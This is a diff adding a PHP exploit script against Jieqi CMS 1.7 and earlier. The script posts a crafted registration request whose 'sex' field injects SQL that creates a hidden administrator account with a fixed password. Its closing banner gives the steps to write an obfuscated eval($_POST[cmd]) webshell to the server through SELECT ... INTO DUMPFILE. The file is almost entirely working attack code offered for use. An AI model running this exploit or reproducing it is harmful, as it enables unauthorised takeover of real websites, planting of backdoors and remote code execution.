@@ -1,0 +1,66 @@
+<?php
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet, $port){
+        $sock = fsockopen($host, $port);
+        while (!$sock){
+                print "\n[-] No response from {$host}:$port Trying again...";
+                $sock = fsockopen($host, $port);
+        }
+        fputs($sock, $packet);
+        while (!feof($sock)) $resp .= fread($sock, 1024);
+        fclose($sock);
+        print $resp;
+        return $resp;
+}
+
+print_r('
++---------------------------------------------------------------------------+
+|   Jieqi CMS Add Manager [version <=<strong><font color="#FF0000">1.7</font></strong>]                                        |
++---------------------------------------------------------------------------+
+|   By   : 蓝孩(b1u3b0y)                                                    |
+|   Team : MyClover.Org        && Insight-Labs.Org                                    |
+|   Date : 2012.3.25                                                              |
+|   Blog : hi.baidu.com/b1ueb0y                                                |
++---------------------------------------------------------------------------+
+');
+
+if ($argc < 4)
+{
+        print "\nUsage......: php $argv[0] host port path\n";
+        print "\nExample....: php $argv[0] localhost 80 /\n";
+        die();
+}
+
+$host = $argv[1];
+$port = $argv[2];
+$path = $argv[3];
+
+$payload  = "username=asd123s&password=imnothack&repassword=imnothack&email=12sds2fg@QQ.COM&sex=9,'asd34sadsa@QQ.COM','',0,0,'','','','','','','','',1332592733,0,0,0,1,0,0,0,0,10,10,0,0,0,0,0,0,0,0),(0, 0, 'b1u3b0y', 'b1u3b0y', '2eb429c676681a7bf5ae8702aa768363', 2, 1332592733, 'H', 9, 'hello@myclover.org', '', 0, 0, '', '', '', '', '', '', '', '', 1332592733, 0, 0, 0, 1, 0, 0, 0, 0, 10, 10, 0, 0, 0,0, 0, 0, 0, 0)#&qq=&url=&action=newuser&submit=%CC%E1+%BD%BB\r\n";
+$packet = "POST {$path}register.php?do=submit HTTP/1.1\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Cookie: jieqiVisitInfo=jieqiUserLogin%3D1332488363%2CjieqiUserId%3D1; PHPSESSID=ho4u03ebnlq6cl6vlg1t2kbjg2";
+$packet .= "Connection: close\r\n\r\n";
+$packet .= $payload;
+
+http_send($host, $packet, $port);
+
+print_r('
++---------------------------------------------------------------------------+
+[+] Add manager successful?  Please check it yourself!
+[ ] Default URL: http://localhost/admin
+[ ] username = b1u3b0y
+[ ] password = lanhai
++---------------------------------------------------------------------------+
+[+] Get Webshell (mysql用户需要file_priv权限)
+[ ] [系统工具] -> [系统信息]  (Get Path)
+[ ] [数据维护] -> [数据库升级] 
+[ ] 执行 [ select concat(char(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)) into dumpfile \'C:\\\\wwwroot\\\\1.php\' ]
+[ ] http://localhost/1.php (password:cmd)
++---------------------------------------------------------------------------+
+');
+?>
